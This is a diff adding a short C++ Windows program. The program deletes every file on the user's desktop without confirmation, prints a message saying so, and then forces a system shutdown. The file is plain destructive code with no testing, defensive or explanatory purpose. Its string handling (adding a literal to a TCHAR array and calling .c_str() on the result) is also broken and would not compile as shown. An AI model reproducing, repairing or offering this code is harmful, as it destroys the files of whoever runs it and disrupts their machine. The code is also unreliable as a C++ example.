@@ -1,0 +1,44 @@
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
+
+int main()
+{
+    // Get the path to the user's desktop
+    TCHAR desktopPath[MAX_PATH];
+    SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
+
+    // Set up a handle to the directory
+    HANDLE hFind;
+    WIN32_FIND_DATA findFileData;
+    hFind = FindFirstFile((desktopPath + "\\*.*").c_str(), &findFileData);
+
+    // Iterate through all files in the directory
+    if (hFind != INVALID_HANDLE_VALUE)
+    {
+        do
+        {
+            // Skip over "." and ".."
+            if (strcmp(findFileData.cFileName, ".") == 0 ||
+                strcmp(findFileData.cFileName, "..") == 0)
+            {
+                continue;
+            }
+
+            // Delete the file
+            DeleteFile((desktopPath + "\\" + findFileData.cFileName).c_str());
+        } while (FindNextFile(hFind, &findFileData));
+
+        // Close the handle
+        FindClose(hFind);
+    }
+
+    cout << "Deleted all files from the desktop." << endl;
+    cout << "Shutting down..." << endl;
+
+    // Use the ExitWindowsEx function to shut down the computer
+    ExitWindowsEx(EWX_SHUTDOWN, 0);
+
+    return 0;
+}
